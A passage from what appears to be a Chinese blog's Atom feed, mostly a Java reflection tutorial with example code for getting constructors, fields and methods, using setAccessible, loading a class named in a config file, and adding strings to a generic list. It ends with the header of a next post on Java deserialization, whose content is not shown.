class="headerlink" title="为什么需要反射？"></a>为什么需要反射？</h4><p>反射赋予了JVM动态编译的能力，动态编译可以最大限度的体现Java的灵活性，否则类的元信息只能通过静态编译的形式实现，而不能动态编译，也就是说在编译以后，程序在运行时的行为就是固定的了，如果要在运行时改变程序的行为，就需要动态编译，因此在Java中就需要反射来实现。</p><p>反射举例</p><p>首先实现一个<code>Person</code>类，在<code>Person</code>类中有成员变量，构造函数，和成员方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Person (String name,<span class="keyword">int</span> age) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name,<span class="keyword">int</span> age,String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"show"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Person</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"method"</span> + s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getString</span><span class="params">(String s,<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s + <span class="string">"---"</span> + i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"function"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">", address='"</span> + address + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射获取到字节码文件对象的三种方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Person p = <span class="keyword">new</span> Person();</span><br><span class="line">Class c1 = p.getClass();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c2 = Person<span class="class">.<span class="keyword">class</span>()</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c3 = Class.forName(<span class="string">"refTest.Person"</span>);</span><br></pre></td></tr></table></figure><p>通过反射获取公共有参构造方法并实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.internal.jxc.ap.Const;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取字节码文件对象</span></span><br><span class="line">        Class c = Class.forName(<span class="string">"refTest.Person"</span>);</span><br><span class="line">        Constructor con = c.getConstructor(String<span class="class">.<span class="keyword">class</span>,<span class="title">int</span>.<span class="title">class</span>,<span class="title">String</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        Object obj = con.newInstance(<span class="string">"elssm"</span>,<span class="number">22</span>,<span class="string">"西安"</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射获取私有构造方法并实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.internal.jxc.ap.Const;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取字节码文件对象</span></span><br><span class="line">        Class c = Class.forName(<span class="string">"refTest.Person"</span>);</span><br><span class="line">      <span class="comment">//获取私有的有参构造方法对象</span></span><br><span class="line">        Constructor con = c.getDeclaredConstructor(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        con.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = con.newInstance(<span class="string">"elssm"</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射获取所有的成员变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest1;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取字节码文件对象</span></span><br><span class="line">        Class c = Class.forName(<span class="string">"refTest.Person"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取所有的成员变量</span></span><br><span class="line">        Field[] fields = c.getDeclaredFields();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Field field:fields) &#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射获取成员变量类型并使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取字节码文件对象</span></span><br><span class="line">        Class c = Class.forName(<span class="string">"refTest.Person"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过无参构造方法创建对象</span></span><br><span class="line">        Constructor con = c.getConstructor();</span><br><span class="line">        Object obj = con.newInstance();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取单个成员变量</span></span><br><span class="line">        Field addressField = c.getField(<span class="string">"address"</span>);</span><br><span class="line">        addressField.set(obj,<span class="string">"西安"</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取name并对其赋值</span></span><br><span class="line">        Field nameField = c.getDeclaredField(<span class="string">"name"</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(obj,<span class="string">"elssm"</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取age并对其赋值</span></span><br><span class="line">        Field ageField = c.getDeclaredField(<span class="string">"age"</span>);</span><br><span class="line">        ageField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ageField.set(obj,<span class="number">22</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射获取所有的成员方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Class.forName(<span class="string">"refTest.Person"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//      Method[] methods = c.getMethods(); //获取自己的包括父亲的公共方法</span></span><br><span class="line">        Method[] methods = c.getDeclaredMethods(); <span class="comment">//获取自己的所有的方法</span></span><br><span class="line">        <span class="keyword">for</span> (Method method:methods)&#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射获取单个成员方法并使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Class.forName(<span class="string">"refTest.Person"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor con = c.getConstructor();</span><br><span class="line">        Object obj = con.newInstance();</span><br><span class="line">        <span class="comment">//获取单个方法并使用</span></span><br><span class="line">        <span class="comment">//public Method getMethod(String name,Class&lt;?&gt;... parameterTypes)</span></span><br><span class="line">        <span class="comment">//第一个参数表示的方法名，第二个参数表示的是方法的参数的class类型</span></span><br><span class="line">        Method method = c.getMethod(<span class="string">"show"</span>);</span><br><span class="line">        <span class="comment">//public Object invoke(Object obj,Object... args)</span></span><br><span class="line">        <span class="comment">//返回值是Object接收，第一个参数表示对象是谁，第二个参数表示调用该方法的实际参数</span></span><br><span class="line">        method.invoke(obj); <span class="comment">//本质是调用obj对象的method方法</span></span><br><span class="line">      </span><br><span class="line">      System.out.println(<span class="string">"------------"</span>);</span><br><span class="line">        Method method1 = c.getMethod(<span class="string">"method"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        method1.invoke(obj,<span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"------------"</span>);</span><br><span class="line">        Method method2 = c.getMethod(<span class="string">"getString"</span>, String<span class="class">.<span class="keyword">class</span>, <span class="title">int</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        Object objString = method2.invoke(obj,<span class="string">"elssm"</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(objString);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"------------"</span>);</span><br><span class="line">        Method method3 = c.getDeclaredMethod(<span class="string">"function"</span>);</span><br><span class="line">        method3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        method3.invoke(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="几个反射的例子"><a href="#几个反射的例子" class="headerlink" title="几个反射的例子"></a>几个反射的例子</h4><h5 id="通过反射运行配置文件内容"><a href="#通过反射运行配置文件内容" class="headerlink" title="通过反射运行配置文件内容"></a>通过反射运行配置文件内容</h5><p>代码结构如下图</p><p><img src="/2021/09/30/Java反射学习/1.png" alt="1"></p><p><code>class.txt</code>中写的是配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">className = test.Teacher</span><br><span class="line">methodName = love</span><br></pre></td></tr></table></figure><p><code>Student</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">love</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"爱生活，爱学习"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Teacher</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">love</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"爱生活，爱教学"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Worker</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Worker</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">love</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"爱生活，爱工作"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Test</code>类实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//加载键值对数据</span></span><br><span class="line">        Properties prop = <span class="keyword">new</span> Properties();</span><br><span class="line">        FileReader fr = <span class="keyword">new</span> FileReader(<span class="string">"./src/test/class.txt"</span>);</span><br><span class="line">        prop.load(fr);</span><br><span class="line">        fr.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取数据</span></span><br><span class="line">        String className = prop.getProperty(<span class="string">"className"</span>);</span><br><span class="line">        String methodName = prop.getProperty(<span class="string">"methodName"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射</span></span><br><span class="line">        Class c = Class.forName(className);</span><br><span class="line"></span><br><span class="line">        Constructor con = c.getConstructor();</span><br><span class="line">        Object obj = con.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用方法</span></span><br><span class="line">        Method m = c.getMethod(methodName);</span><br><span class="line">        m.invoke(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="通过反射越过泛型检查"><a href="#通过反射越过泛型检查" class="headerlink" title="通过反射越过泛型检查"></a>通过反射越过泛型检查</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayListDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//创建集合对象</span></span><br><span class="line">        ArrayList&lt;Integer&gt; array = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">        Class c = array.getClass(); <span class="comment">//集合ArrayList的class对象</span></span><br><span class="line">        Method m = c.getMethod(<span class="string">"add"</span>,Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        m.invoke(array,<span class="string">"hello"</span>); <span class="comment">//调用array的add方法，传入的值是hello</span></span><br><span class="line">        m.invoke(array,<span class="string">"world"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(array);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="通过反射写一个通用的设置某个对象的某个属性为指定的值"><a href="#通过反射写一个通用的设置某个对象的某个属性为指定的值" class="headerlink" title="通过反射写一个通用的设置某个对象的某个属性为指定的值"></a>通过反射写一个通用的设置某个对象的某个属性为指定的值</h5><p>首先写一个实现类<code>Tool</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tool</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setProperty</span><span class="params">(Object obj,String propertyName,Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//根据对象获取字节码文件对象</span></span><br><span class="line">        Class c = obj.getClass();</span><br><span class="line">        <span class="comment">//获取该对象的propertyName成员变量</span></span><br><span class="line">        Field field = c.getDeclaredField(propertyName);</span><br><span class="line">        <span class="comment">//取消访问检查</span></span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//给对象的成员变量赋值为指定的值</span></span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类<code>ToolDemo</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ToolDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        Tool t = <span class="keyword">new</span> Tool();</span><br><span class="line">        t.setProperty(p,<span class="string">"name"</span>,<span class="string">"elssm"</span>);</span><br><span class="line">        t.setProperty(p,<span class="string">"age"</span>,<span class="number">22</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name + <span class="string">"----"</span> + age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;类的加载&quot;&gt;&lt;a href=&quot;#类的加载&quot; class=&quot;headerlink&quot; title=&quot;类的加载&quot;&gt;&lt;/a&gt;类的加载&lt;/h4&gt;&lt;p&gt;当程序要使用某个类时，如果该类还未被加载到内存中，则系统会通过加载，连接，初始化三步来实现对这个类进行初始化。&lt;/p&gt;
&lt;u
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化漏洞基础</title>
    <link href="elssm.github.io/2021/09/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"/>
    <id>elssm.github.io/2021/09/25/Java反序列化漏洞基础/</id>
    <published>2021-09-25T08:22:41.000Z</published>
    <updated>2021-09-27T01:33:13.636Z</updated>
    
